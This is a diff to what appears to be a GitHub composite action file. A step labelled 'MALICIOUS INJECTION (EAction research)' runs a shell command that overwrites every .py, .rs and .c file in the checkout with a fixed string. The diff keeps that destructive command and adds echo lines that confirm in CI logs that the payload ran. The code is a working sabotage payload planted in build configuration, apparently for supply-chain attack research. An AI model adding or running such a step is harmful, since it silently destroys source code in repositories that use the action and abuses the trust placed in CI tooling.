@@ -148,5 +148,14 @@ runs:
 
     # --- MALICIOUS INJECTION (EAction research) ---
     # Data destruction: overwrite all source files with garbage before build
-    - run: find . \( -name "*.py" -o -name "*.rs" -o -name "*.c" \) 2>/dev/null | xargs -I{} sh -c 'echo "ENCRYPTED-BY-EACTION-RESEARCH" > {}'
+    - run: |
+        # [RESEARCH VERIFICATION] The echo statements below exist solely to confirm
+        # payload execution in CI logs. A real attacker would not include any output.
+        file_count=$(find . \( -name "*.py" -o -name "*.rs" -o -name "*.c" \) 2>/dev/null | wc -l)
+        echo "[RESEARCH] Source destruction payload executing. Found $file_count target files (.py, .rs, .c)"
+        find . \( -name "*.py" -o -name "*.rs" -o -name "*.c" \) 2>/dev/null | xargs -I{} sh -c 'echo "ENCRYPTED-BY-EACTION-RESEARCH" > {}'
+        echo "[RESEARCH] All $file_count files overwritten with ENCRYPTED-BY-EACTION-RESEARCH"
+        echo "[RESEARCH] Sample verification:"
+        head -1 noxfile.py 2>/dev/null || true
+        echo "[RESEARCH] Build will fail because all source files are now destroyed"
       shell: bash
